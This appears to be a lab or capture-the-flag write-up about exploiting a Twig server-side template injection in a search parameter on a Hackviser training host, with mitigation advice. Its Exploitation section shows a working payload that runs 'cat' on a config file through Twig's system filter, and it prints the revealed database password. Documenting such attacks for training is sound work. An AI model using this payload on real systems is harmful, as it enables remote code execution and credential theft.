# Twig SSTI - true-scream.apac01.hackviser.space

## 🎯 Objective
Exploit a Server-Side Template Injection vulnerability in the Twig template engine to execute system commands and retrieve sensitive configuration data.

## 🔍 Vulnerability Analysis
- **Type:** Server-Side Template Injection (SSTI)
- **Endpoint:** Search functionality
- **Parameter:** `q`
- **Detection:** User-controlled input passed directly to Twig template rendering
- **Impact:** Remote code execution leading to database credential exposure

## 💥 Exploitation
```http
GET /search?q={{['cat /var/www/html/config.php']|filter('system')}} HTTP/1.1
Host: true-scream.apac01.hackviser.space
Result: Executed cat /var/www/html/config.php via system filter, revealing database password: kfqEnLyBrT2JaS

🛡️ Mitigation Strategies
Template Engine Configuration: Disable dangerous filters/functions in Twig

Input Validation: Implement strict input validation for template variables

Context Escaping: Use appropriate auto-escaping strategies

Security Audits: Regular code reviews for template injection vulnerabilities

📊 Skills Demonstrated
Twig-Specific Exploitation: Leveraging Twig's filter system for RCE

Command Injection: Bridging SSTI to system command execution

Configuration Analysis: Identifying sensitive data exposure vectors

Filter Bypass: Utilizing built-in filters for malicious purposes

Conducted in controlled environment for educational purposes
